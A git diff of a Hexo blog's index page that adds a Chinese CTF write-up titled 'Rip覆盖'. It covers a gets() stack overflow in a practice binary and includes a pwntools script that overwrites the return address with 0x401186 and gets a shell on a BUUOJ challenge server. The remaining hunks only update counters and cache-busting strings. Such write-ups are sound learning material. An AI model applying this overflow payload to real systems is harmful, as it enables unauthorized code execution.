@@ -23,7 +23,7 @@
 <meta name="twitter:card" content="summary">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,gh/nexmoe/nexmoe.github.io@latest/lib/mdui_043tiny/css/mdui.css,gh/nexmoe/nexmoe.github.io@latest/lib/iconfont/iconfont.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css?v=233" crossorigin>
   
-  <link rel="stylesheet" href="/css/style.css?v=1611742644364">
+  <link rel="stylesheet" href="/css/style.css?v=1611748516502">
 <meta name="generator" content="Hexo 5.3.0"></head>
 
 <body class="mdui-drawer-body-left">
@@ -47,7 +47,7 @@
         </a>
     </div>
     <div class="nexmoe-count">
-        <div><span>文章</span>7</div>
+        <div><span>文章</span>8</div>
         <div><span>标签</span>5</div>
         <div><span>分类</span>2</div>
     </div>
@@ -122,7 +122,7 @@
 
         <li class="category-list-item">
           <a class="category-list-link" href="/categories/wp/">wp</a>
-          <span class="category-list-count">6</span>
+          <span class="category-list-count">7</span>
         </li>
 
         
@@ -136,7 +136,7 @@
   
   <div class="nexmoe-widget-wrap">
     <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
-      <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Web/" style="font-size: 20px;">Web</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a>
+      <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a>
     </div>
     
   </div>
@@ -146,7 +146,7 @@
   <div class="nexmoe-widget-wrap">
     <h3 class="nexmoe-widget-title">文章归档</h3>
     <div class="nexmoe-widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a><span class="archive-list-count">7</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a><span class="archive-list-count">8</span></li></ul>
     </div>
   </div>
 
@@ -172,6 +172,56 @@
   <div id="nexmoe-content">
     <div class="nexmoe-primary">
         <section class="nexmoe-posts">
+    
+    <div class="nexmoe-post">
+        <a href="/2021/01/27/Rip%E8%A6%86%E7%9B%96/">
+            
+                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
+                    <img data-src="https://ftp.bmp.ovh/imgs/2021/01/f6028058294fef2b.jpg" data-sizes="auto" alt="Rip覆盖" class="lazyload">
+                    <h1>Rip覆盖</h1>
+                </div>
+            
+        </a>
+
+        <div class="nexmoe-post-meta nexmoe-rainbow">
+            <a><i class="nexmoefont icon-calendar-fill"></i>2021年01月27日</a>
+            <a><i class="nexmoefont icon-areachart"></i>192 字</a>
+            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
+        </div>
+
+        <article>
+            
+                <a id="more"></a>
+<img src="https://i.loli.net/2021/01/27/LsrJ4dpjkzXOnQl.png" >
+
+<p>实属栈溢出.</p>
+<h2 id="启动IDA"><a href="#启动IDA" class="headerlink" title="启动IDA"></a>启动IDA</h2><img src="https://i.loli.net/2021/01/27/6YANSFgolme5ZDB.png" >
+
+<p>这个gets没有限制输入,存在栈溢出漏洞.</p>
+<img src="https://i.loli.net/2021/01/27/MtCuZR9sfJaQdoV.png" >
+
+<p>需要我们输入来获取flag;</p>
+<p>在main函数下还有一个fun函数;我们可以点开看看看</p>
+<img src="https://i.loli.net/2021/01/27/TatPnLBF3CpOQsi.png" >
+
+<p>是一个系统调用且start at 401186(待会payload可以用到)</p>
+<p>双击s来到stack of main视图,这里了解了我们只需存入15个字节即可劫持函数返回地址<br><img src = 'https://ftp.bmp.ovh/imgs/2021/01/e6e423001264fe86.png' /></p>
+<p>IDA方面进行的差不多了,下面可以开始着手写脚本了</p>
+<h2 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+h<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27829</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">15</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401186</span><span class="token punctuation">)</span>
+h<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+h<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><img src = 'https://ftp.bmp.ovh/imgs/2021/01/3b7387aaa01d232f.png' />
+
+<p>刚开始还不知道要干什么,以为又是脚本写错了,后来才发觉是要执行cat /flag命令</p>
+<img src = 'https://ftp.bmp.ovh/imgs/2021/01/ff3701318adda06f.png' />
+
+<p>get flag{8bf972eb-867d-485b-94d5-737f5bc12947}</p>
+
+            
+        </article>
+    </div>
     
     <div class="nexmoe-post">
         <a href="/2021/01/27/ciscn-2019-n-1/">
@@ -325,7 +375,7 @@
 
 
 <script src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
- <script src="/js/app.js?v=1611742644365"></script>
+ <script src="/js/app.js?v=1611748516503"></script>
 
   
 
